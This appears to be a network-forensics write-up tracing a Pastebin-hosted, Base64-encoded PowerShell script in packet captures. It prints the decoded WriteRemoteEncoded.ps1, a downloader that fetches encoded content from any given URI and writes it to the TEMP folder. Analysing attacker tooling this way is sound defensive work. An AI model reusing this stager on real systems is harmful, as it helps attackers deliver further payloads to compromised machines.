## Creation of `WriteRemoteEncoded.ps1`

### **Objective:**
Identify and decode the Base64-encoded script downloaded from Pastebin during the observed TCP session and verify its role in the creation of the `WriteRemoteEncoded.ps1` script.

### **Tool Used:**
- Wireshark

### **Wireshark Filter Used:**
To locate the relevant packets in Wireshark, the following display filter was used to identify HTTP GET requests to Pastebin and the corresponding HTTP responses:
```plaintext
http.host == "pastebin.com" && http.request.uri == "/raw/VeLUwUuq"
```

#### **2. HTTP Response:**
- **Frame Number:** 103480
- **Arrival Time (UTC):** 2019-08-17 05:44:17.285091
- **Source IP:** 104.20.209.21

### **TCP Stream Analysis:**

Using Wiresharkâ€™s "Follow TCP Stream" feature, the entire sequence of data exchanged during this session was examined. This included both the GET request and the HTTP response, where the Base64-encoded data was identified.

### **Base64 Decoding:**

The extracted Base64 string was decoded using a command-line utility:
```bash
echo "UGFyYW0oCiAgICBbUGFyYW1ldGVyKE1hbmRhdG9yeT0kdHJ1ZSwKICAgIFZhbHVlRnJvbVBpcGVMaW5lPSRmYWxzZSldCiAgICBbU3RyaW5nW11dCiAgICAkVXJpLAoKICAgIFtQYXJhbWV0ZXIoTWFuZGF0b3J5PSR0cnVlLAogICAgVmFsdWVGcm9tUGlwZUxpbmU9JGZhbHNlKV0KICAgIFtTdHJpbmdbXV0KICAgICRGaWxlTmFtZQopCgpXcml0ZS1Ib3N0ICRVcmkKCiRwYXRoID0gIiRlbnY6VEVNUFwkRmlsZU5hbWUiCmlmIChUZXN0LVBhdGggLVBhdGggJHBhdGgpIHsKICAgIFdyaXRlLUhvc3QgIlsqXSBGaWxlIGFscmVhZHkgZXhpc3QgYXQgJFNjcmlwdFBhdGgiCiAgICByZXR1cm4gLTEKfQoKJGRhdGEgPSBbU3lzdGVtLkNvbnZlcnRdOjpGcm9tQmFzZTY0U3RyaW5nKChJbnZva6UtV2ViUmVxdWVzdCAtVXJpICIkVXJpIiAtVXNlQmFzaWNQYXJzaW5nKS5jb250ZW50KQpbU3lzdGVtLklPLkZpbGVdOjpXcml0ZUFsbEJ5dGVzKCRwYXRoLCAkZGF0YSk=" | base64 -d
```

### **Decoded Script:**
```powershell
Param(
    [Parameter(Mandatory=$true,
    ValueFromPipeLine=$false)]
    [String[]]
    $Uri,

    [Parameter(Mandatory=$true,
    ValueFromPipeLine=$false)]
    [String[]]
    $FileName
)

Write-Host $Uri

$path = "$env:TEMP\$FileName"
if (Test-Path -Path $path) {
    Write-Host "[*] File already exist at $ScriptPath"
    return -1
}

$data = [System.Convert]::FromBase64String((Invoke-WebRequest -Uri "$Uri" -UseBasicParsing).content)
[System.IO.File]::WriteAllBytes($path, $data)
```

### **Connection to `WriteRemoteEncoded.ps1`:**

The decoded script content matches exactly with the PowerShell script `WriteRemoteEncoded.ps1` that was found on the compromised system. This means that the Base64 content was used to create and execute the `WriteRemoteEncoded.ps1` script, which subsequently downloaded additional malicious payloads to the system.

### **Summary:**

This script, which was encoded in Base64 and hosted on Pastebin, is responsible for downloading and saving a file from a remote location. The script first checks if a file already exists at the specified path and, if not, proceeds to download and save the file using the Base64-decoded content fetched from the specified URI. The decoded script directly corresponds to `WriteRemoteEncoded.ps1`, confirming that this script was downloaded from Pastebin and used as part of the attack.

### **Conclusions:**
- **Threat Identification:** The Base64-encoded script represents a method used by the attacker to download additional payloads to the compromised system.
- **Critical Observation:** The decoded content directly correlates to the PowerShell script `WriteRemoteEncoded.ps1`, confirming that this script was downloaded and executed on the compromised system as part of the attack chain.
- **Remediation Actions:** Immediate inspection and potential removal of any files downloaded via this method are recommended, along with further forensic analysis to identify and mitigate any additional threats.

This report now accurately reflects the role of the Base64-encoded data in creating the `WriteRemoteEncoded.ps1` script on the compromised system.
